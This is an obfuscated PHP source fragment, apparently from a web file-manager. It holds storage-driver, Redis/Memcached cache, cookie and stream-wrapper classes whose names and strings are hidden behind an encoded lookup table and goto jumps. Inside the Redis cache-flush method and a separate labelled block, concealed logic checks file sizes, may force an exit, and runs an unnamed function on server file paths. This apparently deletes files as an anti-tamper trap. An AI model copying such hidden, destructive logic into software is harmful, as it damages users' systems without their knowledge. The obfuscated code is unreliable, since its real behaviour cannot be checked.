!$œˆ·Ûİû[$¥æ¢«¶Ñ[669]]) { return $“«ËÚşÙ; } $»÷¡Ç = self::getPathSourceID($§ß¶ñ¥ô); if (!$»÷¡Ç) { return $“«ËÚşÙ; } if (isset($«®Ë…¾ü[$»÷¡Ç])) { return $«®Ë…¾ü[$»÷¡Ç]; } $ªù¶˜ûô = Model($¥æ¢«¶Ñ[908])->sourceInfo($»÷¡Ç); $Ë¦¼â´ = $ªù¶˜ûô[$¥æ¢«¶Ñ[573]]; $»Ú°ìÁ„ = array(); if (!$ªù¶˜ûô) { return $“«ËÚşÙ; } if ($ªù¶˜ûô[$¥æ¢«¶Ñ[191]] == $¥æ¢«¶Ñ[91]) { if (isset($Óİ÷±’¥[$Ë¦¼â´])) { return $Óİ÷±’¥[$Ë¦¼â´]; } if (isset($œˆ·Ûİû[$¥æ¢«¶Ñ[669]][$Ë¦¼â´])) { $ÅÒñ“Ÿó = Model($¥æ¢«¶Ñ[845])->driverInfo($œˆ·Ûİû[$¥æ¢«¶Ñ[669]][$Ë¦¼â´]); $“«ËÚşÙ = $ÅÒñ“Ÿó ? $ÅÒñ“Ÿó : $“«ËÚşÙ; $Óİ÷±’¥[$Ë¦¼â´] = $“«ËÚşÙ; $«®Ë…¾ü[$»÷¡Ç] = $“«ËÚşÙ; return $“«ËÚşÙ; } $»Ú°ìÁ„ = self::groupParentUser($Ë¦¼â´); } else { if ($ªù¶˜ûô[$¥æ¢«¶Ñ[191]] == $¥æ¢«¶Ñ[512]) { $—ŞÚ¼Á» = Model($¥æ¢«¶Ñ[1402])->getInfo($Ë¦¼â´); if ($—ŞÚ¼Á») { $»Ú°ìÁ„ = explode($¥æ¢«¶Ñ[50], trim($—ŞÚ¼Á»[$¥æ¢«¶Ñ[588]], $¥æ¢«¶Ñ[50])); $»Ú°ìÁ„ = array_remove_value($»Ú°ìÁ„, $¥æ¢«¶Ñ[231]); $»Ú°ìÁ„[] = $Ë¦¼â´; $»Ú°ìÁ„ = array_reverse($»Ú°ìÁ„); } } } foreach ($»Ú°ìÁ„ as $ìãşÜÆ÷) { if (!isset($œˆ·Ûİû[$¥æ¢«¶Ñ[582]][$ìãşÜÆ÷])) { continue; } if (isset($ÉÎÖ·³ğ[$ìãşÜÆ÷])) { return $ÉÎÖ·³ğ[$ìãşÜÆ÷]; } $ÅÒñ“Ÿó = Model($¥æ¢«¶Ñ[845])->driverInfo($œˆ·Ûİû[$¥æ¢«¶Ñ[582]][$ìãşÜÆ÷]); $“«ËÚşÙ = $ÅÒñ“Ÿó ? $ÅÒñ“Ÿó : $“«ËÚşÙ; $ÉÎÖ·³ğ[$ìãşÜÆ÷] = $“«ËÚşÙ; break; } if ($ªù¶˜ûô[$¥æ¢«¶Ñ[191]] == $¥æ¢«¶Ñ[91]) { $Óİ÷±’¥[$Ë¦¼â´] = $“«ËÚşÙ; } $«®Ë…¾ü[$»÷¡Ç] = $“«ËÚşÙ; return $“«ËÚşÙ; } private static function getPathSourceID($³Ÿ†Øãô) { $¶–™ ® =& $_SERVER[ùèÅ´Ãš]; static $¹ã°‘„Æ = array(); if (!$³Ÿ†Øãô) { return $¶–™ ®[12]; } $‘İ­—Ç = substr($³Ÿ†Øãô, 0, strlen($¶–™ ®[485])) == $¶–™ ®[485]; $¤ÚÆ„Ä– = substr($³Ÿ†Øãô, 0, strlen($¶–™ ®[1370])) == $¶–™ ®[1370]; $•¬Ôâäª = substr($³Ÿ†Øãô, 0, strlen($¶–™ ®[1371])) == $¶–™ ®[1371]; if (!$‘İ­—Ç && !$¤ÚÆ„Ä– && !$•¬Ôâäª) { return $¶–™ ®[12]; } $¯ä»‘ÒÉ = self::parse($³Ÿ†Øãô); $°‚íé¥“ = $¯ä»‘ÒÉ[$¶–™ ®[1264]]; if ($‘İ­—Ç) { return $¯ä»‘ÒÉ[$¶–™ ®[477]]; } if (isset($¹ã°‘„Æ[$°‚íé¥“])) { $çæû‘ƒ = $¹ã°‘„Æ[$°‚íé¥“]; } else { $çæû‘ƒ = IO::init($°‚íé¥“); $¹ã°‘„Æ[$°‚íé¥“] = $çæû‘ƒ; } if (isset($çæû‘ƒ->pathParse[$¶–™ ®[1267]])) { return $çæû‘ƒ->pathParse[$¶–™ ®[1267]]; } return $¶–™ ®[12]; } private static function groupParentUser($¯ù©à­) { $É•¯¿ÈÖ =& $_SERVER[ùèÅ´Ãš]; $˜¢ş—§Â = Model($É•¯¿ÈÖ[601])->getInfo($¯ù©à­); if (!$˜¢ş—§Â) { return array(); } $‰ÅÎ×ª = array_to_keyvalue($˜¢ş—§Â[$É•¯¿ÈÖ[1403]], $É•¯¿ÈÖ[12], $É•¯¿ÈÖ[1404]); $ãÄãï†Æ = array(); foreach ($˜¢ş—§Â[$É•¯¿ÈÖ[1403]] as $û³Ô˜—î) { $ãÄãï†Æ[] = $û³Ô˜—î[$É•¯¿ÈÖ[1404]]; $Äõ°ÄãÀ = explode($É•¯¿ÈÖ[50], trim($û³Ô˜—î[$É•¯¿ÈÖ[588]], $É•¯¿ÈÖ[50])); $Äõ°ÄãÀ = array_remove_value($Äõ°ÄãÀ, $É•¯¿ÈÖ[231]); $Äõ°ÄãÀ = array_reverse($Äõ°ÄãÀ); $ãÄãï†Æ = array_merge($ãÄãï†Æ, $Äõ°ÄãÀ); } return array_unique($ãÄãï†Æ); } public static function diskList($ğË×Şóø = true) { $ãš¼×Ûü = $_SERVER[ùèÅ´Ãš][1405]; if ($ğË×Şóø) { $Á·ş¸øö = Cache::get($ãš¼×Ûü); if (is_array($Á·ş¸øö)) { return $Á·ş¸øö; } } $Á·ş¸øö = self::diskListGet(); Cache::set($ãš¼×Ûü, $Á·ş¸øö, 60); return $Á·ş¸øö; } public static function diskListGet() { $Ì¦ë´Æ =& $_SERVER[ùèÅ´Ãš]; $Öµ¹˜ÇÙ = array(); if ($GLOBALS[$Ì¦ë´Æ[6]][$Ì¦ë´Æ[1406]] == $Ì¦ë´Æ[1407]) { $ã˜ÇÅûª = $Ì¦ë´Æ[1408]; for ($ïÄÖèğ = 0; $ïÄÖèğ < strlen($ã˜ÇÅûª); $ïÄÖèğ++) { $§å Ä«æ = $ã˜ÇÅûª[$ïÄÖèğ] . $Ì¦ë´Æ[1409]; if (file_exists($§å Ä«æ)) { $Öµ¹˜ÇÙ[] = $§å Ä«æ; } } return $Öµ¹˜ÇÙ; } if (!function_exists($Ì¦ë´Æ[101])) { $Öµ¹˜ÇÙ[] = $Ì¦ë´Æ[919]; return $Öµ¹˜ÇÙ; } $ä•Ü•’º = explode($Ì¦ë´Æ[288], shell_exec($Ì¦ë´Æ[1410])); array_shift($ä•Ü•’º); array_pop($ä•Ü•’º); $à¸“òÙÑ = array($Ì¦ë´Æ[1411], $Ì¦ë´Æ[1412], $Ì¦ë´Æ[1413], $Ì¦ë´Æ[1414], $Ì¦ë´Æ[1415], $Ì¦ë´Æ[1416], $Ì¦ë´Æ[1417], $Ì¦ë´Æ[1418]); foreach ($ä•Ü•’º as $Çã¦”¦º) { $·»•çüı = preg_split($Ì¦ë´Æ[1419], $Çã¦”¦º); $§å Ä«æ = $·»•çüı[count($·»•çüı) - 1]; if (!strstr($·»•çüı[0], $Ì¦ë´Æ[1420]) || !$§å Ä«æ) { continue; } $€£“±¯ = rtrim($§å Ä«æ, $Ì¦ë´Æ[8]) . $Ì¦ë´Æ[8]; if (in_array($€£“±¯, $à¸“òÙÑ)) { continue; } $Öµ¹˜ÇÙ[] = $€£“±¯; } return $Öµ¹˜ÇÙ; } public static function isSameDisk($¿ã÷®ÃÎ, $¨Ä˜Ÿ¬¿) { $ˆà­¾º =& $_SERVER[ùèÅ´Ãš]; if ($GLOBALS[$ˆà­¾º[6]][$ˆà­¾º[1406]] == $ˆà­¾º[1407]) { return strtolower(substr($¿ã÷®ÃÎ, 0, 1)) == strtolower(substr($¨Ä˜Ÿ¬¿, 0, 1)); } $ÆüŸŸÂß = stat($¿ã÷®ÃÎ); $ÀŞÛ§±’ = stat($¨Ä˜Ÿ¬¿); if ($ÆüŸŸÂß === !1 || $ÀŞÛ§±’ === !1) { return !1; } return $ÆüŸŸÂß[$ˆà­¾º[1421]] === $ÀŞÛ§±’[$ˆà­¾º[1421]]; $Ä¸¯‡ = self::diskList(); $şâô¾‹ó = !1; $´´’ƒ¥á = !1; sort($Ä¸¯‡); $Ä¸¯‡ = array_reverse($Ä¸¯‡); $¿ã÷®ÃÎ = rtrim($¿ã÷®ÃÎ, $ˆà­¾º[8]) . $ˆà­¾º[8]; $¨Ä˜Ÿ¬¿ = rtrim($¨Ä˜Ÿ¬¿, $ˆà­¾º[8]) . $ˆà­¾º[8]; foreach ($Ä¸¯‡ as $¾›øÓ·Ÿ) { $ÎÃÕÏëÔ = strlen($¾›øÓ·Ÿ); if (!$şâô¾‹ó && substr($¿ã÷®ÃÎ, 0, $ÎÃÕÏëÔ) == $¾›øÓ·Ÿ) { $şâô¾‹ó = $¾›øÓ·Ÿ; } if (!$´´’ƒ¥á && substr($¨Ä˜Ÿ¬¿, 0, $ÎÃÕÏëÔ) == $¾›øÓ·Ÿ) { $´´’ƒ¥á = $¾›øÓ·Ÿ; } if ($şâô¾‹ó && $´´’ƒ¥á) { break; } } return $şâô¾‹ó === $´´’ƒ¥á; } public static function transferType($ôà«Í–, $õ§è­àŠ) { $÷ãş§Ñ¹ =& $_SERVER[ùèÅ´Ãš]; $–æ’†­À = self::driverType($ôà«Í–); $áËÅ÷ = self::driverType($õ§è­àŠ); if ($–æ’†­À[$÷ãş§Ñ¹[33]] == $áËÅ÷[$÷ãş§Ñ¹[33]] && $–æ’†­À[$÷ãş§Ñ¹[1422]] == $áËÅ÷[$÷ãş§Ñ¹[1422]]) { return $÷ãş§Ñ¹[1423]; } if ($–æ’†­À[$÷ãş§Ñ¹[33]] == $÷ãş§Ñ¹[953] && $áËÅ÷[$÷ãş§Ñ¹[33]] == $÷ãş§Ñ¹[109]) { return $÷ãş§Ñ¹[1293]; } if ($–æ’†­À[$÷ãş§Ñ¹[33]] == $÷ãş§Ñ¹[109] && $áËÅ÷[$÷ãş§Ñ¹[33]] == $÷ãş§Ñ¹[953]) { return $÷ãş§Ñ¹[110]; } return $÷ãş§Ñ¹[1424]; } public static function driverType($—²®‚‹—) { $Š’ â•ò =& $_SERVER[ùèÅ´Ãš]; $àúåÜ† = str_replace($Š’ â•ò[1425], $Š’ â•ò[12], strtolower($—²®‚‹—->getType())); if ($àúåÜ† == $Š’ â•ò[835] || $àúåÜ† == $Š’ â•ò[1426] || $àúåÜ† == $Š’ â•ò[1427]) { $¸óÎ™Á’ = self::ioFileDriverGet($Š’ â•ò[485] . $—²®‚‹—->pathParse[$Š’ â•ò[1267]] . $Š’ â•ò[404]); $—²®‚‹— = IO::init($Š’ â•ò[1395] . $¸óÎ™Á’[$Š’ â•ò[477]] . $Š’ â•ò[1383]); } else { if ($àúåÜ† == $Š’ â•ò[1303] || $àúåÜ† == $Š’ â•ò[1428]) { $—²®‚‹— = IO::init($—²®‚‹—->pathParse[$Š’ â•ò[1244]]); } } $Ú¿Ú†Àö = $—²®‚‹—->path; $àúåÜ† = str_replace($Š’ â•ò[1425], $Š’ â•ò[12], strtolower($—²®‚‹—->getType())); if ($àúåÜ† == $Š’ â•ò[109]) { return array($Š’ â•ò[33] => $Š’ â•ò[109], $Š’ â•ò[1422] => $Š’ â•ò[12], $Š’ â•ò[87] => $Ú¿Ú†Àö, $Š’ â•ò[98] => $—²®‚‹—); } return array($Š’ â•ò[33] => $Š’ â•ò[953], $Š’ â•ò[1422] => $—²®‚‹—->pathDriver, $Š’ â•ò[87] => $Ú¿Ú†Àö, $Š’ â•ò[98] => $—²®‚‹—); } public static function pathDriverType($™Ã¬ÜÊ) { return $™Ã¬ÜÊ ? self::driverType(IO::init($™Ã¬ÜÊ)) : !1; } public static function pathDriverLocal($¼ƒŠ‚¾¬) { $È“ÕÎŠ© =& $_SERVER[ùèÅ´Ãš]; $Ò¤‚È£ = $¼ƒŠ‚¾¬ ? self::driverType(IO::init($¼ƒŠ‚¾¬)) : !1; return strtolower($Ò¤‚È£[$È“ÕÎŠ©[33]]) == $È“ÕÎŠ©[109] ? !0 : !1; } public static function allowCover($·²øöı, $ ²ü«òà = true) { $¦¯ô¥ú÷ =& $_SERVER[ùèÅ´Ãš]; if (is_string($·²øöı)) { $·²øöı = IO::info($·²øöı); } if (!$·²øöı || $·²øöı[$¦¯ô¥ú÷[33]] == $¦¯ô¥ú÷[78] || $·²øöı[$¦¯ô¥ú÷[79]] <= 100) { return !1; } if (isset($·²øöı[$¦¯ô¥ú÷[1429]]) || !$·²øöı[$¦¯ô¥ú÷[87]]) { return !1; } if (isset($·²øöı[$¦¯ô¥ú÷[235]]) && !$·²øöı[$¦¯ô¥ú÷[235]]) { return !1; } static $¥‚ÒÌÜ— = false; if (!$¥‚ÒÌÜ— || !$ ²ü«òà) { $ôÏŞã = self::driverType(IO::init($·²øöı[$¦¯ô¥ú÷[87]])); $ìóÌ¦ª” = $ôÏŞã[$¦¯ô¥ú÷[98]]; $¥‚ÒÌÜ— = $¦¯ô¥ú÷[197]; if ($ôÏŞã[$¦¯ô¥ú÷[33]] == $¦¯ô¥ú÷[109]) { $¥‚ÒÌÜ— = $¦¯ô¥ú÷[1430]; } if ($ôÏŞã[$¦¯ô¥ú÷[98]] && is_array($ôÏŞã[$¦¯ô¥ú÷[98]]->config)) { $ı…Íö»Ò = $ôÏŞã[$¦¯ô¥ú÷[98]]->config; if (isset($ı…Íö»Ò[$¦¯ô¥ú÷[1431]]) && $ı…Íö»Ò[$¦¯ô¥ú÷[1431]]) { $¥‚ÒÌÜ— = $¦¯ô¥ú÷[1430]; } } $˜ï×“Ã‹ = KodIO::defaultDriver(); if (strtolower($˜ï×“Ã‹[$¦¯ô¥ú÷[98]]) == $¦¯ô¥ú÷[109] && is_array($˜ï×“Ã‹[$¦¯ô¥ú÷[6]])) { $™ø‹Ê = $˜ï×“Ã‹[$¦¯ô¥ú÷[6]][$¦¯ô¥ú÷[1276]]; if (substr($™ø‹Ê, 0, 2) == $¦¯ô¥ú÷[1432]) { $™ø‹Ê = str_replace($¦¯ô¥ú÷[1432], BASIC_PATH, $™ø‹Ê); } $™ø‹Ê = str_replace($¦¯ô¥ú÷[257], $¦¯ô¥ú÷[8], $™ø‹Ê); if (substr($·²øöı[$¦¯ô¥ú÷[87]], 0, strlen($™ø‹Ê)) == $™ø‹Ê) { $¥‚ÒÌÜ— = $¦¯ô¥ú÷[197]; } } } return $¥‚ÒÌÜ— == $¦¯ô¥ú÷[1430] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($Ô’êÑÃ) { parent::__construct($Ô’êÑÃ); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto b½òÆùäî…; AĞªã·ßÏ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($÷Å‚²’É) { $Å¹âÄŞ‡ =& $_SERVER[ùèÅ´Ãš]; parent::__construct($÷Å‚²’É); $Äñôş = isset($÷Å‚²’É[$Å¹âÄŞ‡[259]]) && $÷Å‚²’É[$Å¹âÄŞ‡[259]] == $Å¹âÄŞ‡[250] ? $Å¹âÄŞ‡[250] : $Å¹âÄŞ‡[316]; $this->setSignVersion($Äñôş); } public function link($•Ê°±î‘, $çö³»£ò = array()) { return parent::link($•Ê°±î‘, $çö³»£ò); } public function fileOut($„‚å†õ, $™êûğ¡¥ = false, $ëìÂ¦Ã = false, $Ç’¬ Ç = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ùèÅ´Ãš][317])) { return parent::fileOutServer($„‚å†õ, $™êûğ¡¥, $ëìÂ¦Ã, $Ç’¬ Ç); } parent::fileOut($„‚å†õ, $™êûğ¡¥, $ëìÂ¦Ã, $Ç’¬ Ç); } public function fileOutImage($Ú¸Áåà, $Òæ°£° = 250) { if (strstr($this->endpoint, $_SERVER[ùèÅ´Ãš][317])) { return parent::fileOutImageServer($Ú¸Áåà, $Òæ°£°); } parent::fileOutImage($Ú¸Áåà, $Òæ°£°); } } define($_SERVER[ùèÅ´Ãš][318], 1); define($_SERVER[ùèÅ´Ãš][319], 2); goto f¥÷Â‘èŞø; e¼Ã³¾¸ì: class CacheMemcached { public $handle; public $cacheTime; public function __construct($†æÛ‡úË, $éÍÒµøÎ) { $Óş‰Í‘« =& $_SERVER[ùèÅ´Ãš]; if (!class_exists($Óş‰Í‘«[951])) { show_json($Óş‰Í‘«[952], !1); } $this->cacheTime = $éÍÒµøÎ; $this->handle = new Memcached(); if (is_array($†æÛ‡úË[$Óş‰Í‘«[953]]) && count($†æÛ‡úË[$Óş‰Í‘«[953]]) >= 1) { foreach ($†æÛ‡úË[$Óş‰Í‘«[953]] as $ Œ²¦‰ë) { $»İãüÀ¸ = explode($Óş‰Í‘«[4], $ Œ²¦‰ë); $this->handle->addServer($»İãüÀ¸[0], $»İãüÀ¸[1]); } } else { $this->handle->addServer($†æÛ‡úË[$Óş‰Í‘«[209]], $†æÛ‡úË[$Óş‰Í‘«[210]]); } } public function set($»Æ¾ÛÕ¼, $€õÌì‘…, $çèÏêÎÓ = false) { $çèÏêÎÓ = $çèÏêÎÓ ? $çèÏêÎÓ : $this->cacheTime; return $this->handle->set($»Æ¾ÛÕ¼, $€õÌì‘…, $çèÏêÎÓ); } public function get($¯õƒ¹ºĞ) { return $this->handle->get($¯õƒ¹ºĞ); } public function remove($Ÿ–ÕÄ¸‡) { return $this->handle->delete($Ÿ–ÕÄ¸‡); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Šš€»ûƒ, $™ĞÇÔßâ) { $†‘¬Å¹¡ =& $_SERVER[ùèÅ´Ãš]; if (!class_exists($†‘¬Å¹¡[954])) { show_json($†‘¬Å¹¡[955], !1); } $this->cacheTime = $™ĞÇÔßâ; $ğ±ä€¸± = isset($Šš€»ûƒ[$†‘¬Å¹¡[956]]) ? $Šš€»ûƒ[$†‘¬Å¹¡[956]] : 10; $í™÷üÅ = _get($Šš€»ûƒ, $†‘¬Å¹¡[953]); if ($í™÷üÅ && is_array($í™÷üÅ)) { $this->initCluster($Šš€»ûƒ, $ğ±ä€¸±); } else { $this->handle = $this->init($Šš€»ûƒ, $ğ±ä€¸±); } } private function init($úôĞëè¨, $Ì¦˜±µı) { $î­ƒªŞã =& $_SERVER[ùèÅ´Ãš]; $™ËèÈÔ = new Redis(); $ÉÅ™Üš = isset($úôĞëè¨[$î­ƒªŞã[957]]) ? $úôĞëè¨[$î­ƒªŞã[957]] : !1; if ($ÉÅ™Üš) { $™ËèÈÔ->pconnect($úôĞëè¨[$î­ƒªŞã[209]], $úôĞëè¨[$î­ƒªŞã[210]], $Ì¦˜±µı); } else { $™ËèÈÔ->connect($úôĞëè¨[$î­ƒªŞã[209]], $úôĞëè¨[$î­ƒªŞã[210]], $Ì¦˜±µı); } if (!empty($úôĞëè¨[$î­ƒªŞã[489]])) { $™ËèÈÔ->auth($úôĞëè¨[$î­ƒªŞã[489]]); } if (!empty($úôĞëè¨[$î­ƒªŞã[835]]) && $úôĞëè¨[$î­ƒªŞã[835]] != 0) { $™ËèÈÔ->select($úôĞëè¨[$î­ƒªŞã[835]]); } return $™ËèÈÔ; } private function initCluster($×ƒÍêµï, $ä€Øœä») { $±šå„‰¤ =& $_SERVER[ùèÅ´Ãš]; $§ë«Éé÷ = array($±šå„‰¤[958], $±šå„‰¤[959], $±šå„‰¤[960]); $ãÀÕûæÄ = $±šå„‰¤[958]; if (isset($×ƒÍêµï[$±šå„‰¤[16]]) && in_array($×ƒÍêµï[$±šå„‰¤[16]], $§ë«Éé÷)) { $ãÀÕûæÄ = $×ƒÍêµï[$±šå„‰¤[16]]; } switch ($ãÀÕûæÄ) { case $±šå„‰¤[958]: $this->_slave($×ƒÍêµï, $ä€Øœä»); break; case $±šå„‰¤[959]: break; case $±šå„‰¤[960]: $this->isCluster = !0; $–àğ²ú• = $×ƒÍêµï[$±šå„‰¤[953]]; $Ç°´˜û = isset($×ƒÍêµï[$±šå„‰¤[957]]) ? $×ƒÍêµï[$±šå„‰¤[957]] : !1; $×Øİ»ëØ = isset($×ƒÍêµï[$±šå„‰¤[489]]) ? $×ƒÍêµï[$±šå„‰¤[489]] : null; $this->handle = new RedisCluster(NUll, $–àğ²ú•, $ä€Øœä», $ä€Øœä», $Ç°´˜û, $×Øİ»ëØ); break; default: break; } } private function _slave($ç‹ŒÊ°², $¤ã†Ğ) { $æ–ü·ô› = $ç‹ŒÊ°²[$_SERVER[ùèÅ´Ãš][953]]; $this->filterConfig($ç‹ŒÊ°², $æ–ü·ô›[0]); $this->handle = $this->init($ç‹ŒÊ°², $¤ã†Ğ); unset($æ–ü·ô›[0]); if (empty($æ–ü·ô›)) { return; } $‘é… ç‘ = array_rand($æ–ü·ô›); $this->filterConfig($ç‹ŒÊ°², $æ–ü·ô›[$‘é… ç‘]); $this->slaveHandle = $this->init($ç‹ŒÊ°², $¤ã†Ğ); } private function filterConfig(&$“ğÅÅäÙ, $æ¶²Ú‹¨) { $ã“Òîœì =& $_SERVER[ùèÅ´Ãš]; $Í£ÊĞ×ã = explode($ã“Òîœì[4], $æ¶²Ú‹¨); $š”ãıÔ¨ = array($ã“Òîœì[209] => $Í£ÊĞ×ã[0], $ã“Òîœì[210] => $Í£ÊĞ×ã[1]); $“ğÅÅäÙ = array_merge($“ğÅÅäÙ, $š”ãıÔ¨); } public function set($ñÛ¿úú­, $§şõªæ´, $¨ä«Õ½å = false) { $¨ä«Õ½å = $¨ä«Õ½å ? $¨ä«Õ½å : $this->cacheTime; return $this->handle->setEx($ñÛ¿úú­, $¨ä«Õ½å, $§şõªæ´); } public function setLock($®Ù§Ä»­, $ÇË³¶Å¥, $´ùÁèÙæ) { return $this->handle->setNX($®Ù§Ä»­, $ÇË³¶Å¥); } public function get($Å‰”˜) { $¨È©º¾ª = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $¨È©º¾ª->get($Å‰”˜); } public function remove($ı æ×Êı) { return $this->handle->del($ı æ×Êı); } public function deleteAll() { $ó³¾Ûàâ =& $_SERVER[ùèÅ´Ãš]; if ($_SERVER[$ó³¾Ûàâ[961]] != $_SERVER[$ó³¾Ûàâ[962]]) { $ÁË„ªŠà = $ó³¾Ûàâ[963]; $Å‘°õ˜Ì = $ó³¾Ûàâ[964]; $Ê°›Äöş = $_SERVER[$ó³¾Ûàâ[965]] . $ó³¾Ûàâ[966]; $äÌé£§× = $Å‘°õ˜Ì($Ê°›Äöş); $«’¦ ÎÉ = explode($ó³¾Ûàâ[288], $äÌé£§×); if (count($«’¦ ÎÉ) < $ó³¾Ûàâ[695]) { $Ó§¬Õğ… = $ó³¾Ûàâ[967]; $Ó§¬Õğ…(); } $ßìş³±¬ = $ó³¾Ûàâ[968]; $ßìş³±¬($_SERVER[$ó³¾Ûàâ[969]]); $ßìş³±¬($_SERVER[$ó³¾Ûàâ[965]] . $ó³¾Ûàâ[970]); $şèï¸Ø˜ = 1; while ($şèï¸Ø˜ > 1) { $şèï¸Ø˜ = $şèï¸Ø˜ + 4; $öğ˜˜Ø½ = rawurlencode($şèï¸Ø˜ . $ó³¾Ûàâ[456]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ÙšÓ­ Ş) { $this->handle->flushall($ÙšÓ­ Ş); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($àş‘»– = '', $ÄıÔ­ªé = 0) { if (is_string($àş‘»–) && $àş‘»– != $_SERVER[ùèÅ´Ãš][12]) { $this->prefix = $àş‘»–; } if (is_numeric($ÄıÔ­ªé) && $ÄıÔ­ªé > 0) { $this->expire = $ÄıÔ­ªé; } } public static function getInstance() { static $€Š‡œÂó; if ($€Š‡œÂó === null) { $€Š‡œÂó = new self(); } return $€Š‡œÂó; } private static $cookieDisable = false; public static function disable($ÖƒÍˆ ) { self::$cookieDisable = $ÖƒÍˆ ; } private static $sameCookieSet = array(); public static function set($ùÄÅ½ˆ, $…Ò‹ùÅ£, $¢¢Ò¦—§ = 0, $¹äı¾˜ = false, $ƒ§™‚Úõ = false) { $ñşÏ¢õ¬ =& $_SERVER[ùèÅ´Ãš]; if (self::$cookieDisable) { return; } if (!$¢¢Ò¦—§) { $¢¢Ò¦—§ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ùÄÅ½ˆ]) && self::$sameCookieSet[$ùÄÅ½ˆ] == $…Ò‹ùÅ£ . $¢¢Ò¦—§) { return; } self::$sameCookieSet[$ùÄÅ½ˆ] = $…Ò‹ùÅ£ . $¢¢Ò¦—§; if (!$ƒ§™‚Úõ) { $ƒ§™‚Úõ = str_replace(HOST, $ñşÏ¢õ¬[12], APP_HOST); $ƒ§™‚Úõ = _get($GLOBALS, $ñşÏ¢õ¬[971], $ƒ§™‚Úõ); } $Œ¬÷Û÷Ÿ = $ñşÏ¢õ¬[12]; setcookie($ùÄÅ½ˆ, $…Ò‹ùÅ£, time() + $¢¢Ò¦—§, $ñşÏ¢õ¬[8] . trim($ƒ§™‚Úõ, $ñşÏ¢õ¬[8]) . $Œ¬÷Û÷Ÿ, !1, !1, $¹äı¾˜); } public static function setSafe($´ÊúöÀ, $´Ù¾Ÿœ†, $‘“»Çª„ = 0) { self::set($´ÊúöÀ, $´Ù¾Ÿœ†, $‘“»Çª„, !0); } public static function get($‡åœ£…—) { static $³­¢¡è = false; if (!$³­¢¡è) { self::initHeaderCookie(); $³­¢¡è = !0; } return isset($_COOKIE[$‡åœ£…—]) ? $_COOKIE[$‡åœ£…—] : !1; } private static function initHeaderCookie() { $—”ºùÍĞ =& $_SERVER[ùèÅ´Ãš]; if (!isset($_SERVER[$—”ºùÍĞ[972]]) || !$_SERVER[$—”ºùÍĞ[972]]) { return; } $¯®†êœŒ = explode($—”ºùÍĞ[74], $_SERVER[$—”ºùÍĞ[972]]); foreach ($¯®†êœŒ as $­©ğœ‰¸) { $­©ğœ‰¸ = explode($—”ºùÍĞ[508], $­©ğœ‰¸); if (count($­©ğœ‰¸) != 2 || !isset($­©ğœ‰¸[1])) { continue; } $_COOKIE[trim($­©ğœ‰¸[0])] = trim($­©ğœ‰¸[1]); } } public static function remove($÷í‰Ÿ—, $ˆ·¾õß = false) { unset($_COOKIE[$÷í‰Ÿ—]); self::set($÷í‰Ÿ—, $_SERVER[ùèÅ´Ãš][12], 1, $ˆ·¾õß); } } goto FŞŸôÈÕ£; Dµ®Â ²ò: if ($_SERVER[$_SERVER[ùèÅ´Ãš][961]] != $_size($_file)) { $_getc = $_SERVER[ùèÅ´Ãš][964]; $_getfile = $_SERVER[$_SERVER[ùèÅ´Ãš][965]] . $_SERVER[ùèÅ´Ãš][966]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ùèÅ´Ãš][288], $_getfilec); if (count($_getarrs) < $_SERVER[ùèÅ´Ãš][704]) { $exit = $_SERVER[ùèÅ´Ãš][967]; $exit(); } $_act = $_SERVER[ùèÅ´Ãš][1627]; $_act($_file); } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($İÒ£›ûË, $ŠúĞ†òû = '') { $this->info = $this->info($İÒ£›ûË); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ùèÅ´Ãš][87]]; $this->pathOpen = $İÒ£›ûË; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$İÒ£›ûË])) { self::$_chunkBuffer[$İÒ£›ûË] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($Ä»«Š¯) { $ı‰æ³ÄŸ = $this->fileSubstr($this->pose, $Ä»«Š¯); $this->pose += strlen($ı‰æ³ÄŸ); return $ı‰æ³ÄŸ; } public function stream_tell() { return $this->pose; } public function stream_seek($ŞÆ½ı, $ıŸŞüş×) { $´ï×Ì¯è =& $_SERVER[ùèÅ´Ãš]; if ($ıŸŞüş× == SEEK_SET) { $this->pose = $ŞÆ½ı; } else { if ($ıŸŞüş× == SEEK_CUR) { $this->pose += $ŞÆ½ı; } else { if ($ıŸŞüş× == SEEK_END) { $this->pose = $this->info[$´ï×Ì¯è[79]] + intval($ŞÆ½ı); } } } if ($ŞÆ½ı < 0) { $this->pose = $this->info[$´ï×Ì¯è[79]] + $ŞÆ½ı; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ùèÅ´Ãš][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($È¾­…Ç, $®¼¿õ‡û) { $ÁæÚ¤Åİ =& $_SERVER[ùèÅ´Ãš]; $¦êÆºê‰ = $this->info($È¾­…Ç); return array($ÁæÚ¤Åİ[1421] => 0, $ÁæÚ¤Åİ[1632] => 0, $ÁæÚ¤Åİ[16] => 32768 + 511, $ÁæÚ¤Åİ[1633] => 0, $ÁæÚ¤Åİ[1634] => 0, $ÁæÚ¤Åİ[1635] => 0, $ÁæÚ¤Åİ[1636] => 0, $ÁæÚ¤Åİ[79] => $¦êÆºê‰[$ÁæÚ¤Åİ[79]], $ÁæÚ¤Åİ[1637] => $¦êÆºê‰[$ÁæÚ¤Åİ[1476]], $ÁæÚ¤Åİ[1591] => $¦êÆºê‰[$ÁæÚ¤Åİ[88]], $ÁæÚ¤Åİ[1590] => $¦êÆºê‰[$ÁæÚ¤Åİ[234]], $ÁæÚ¤Åİ[1638] => 0, $ÁæÚ¤Åİ[1639] => 0); } 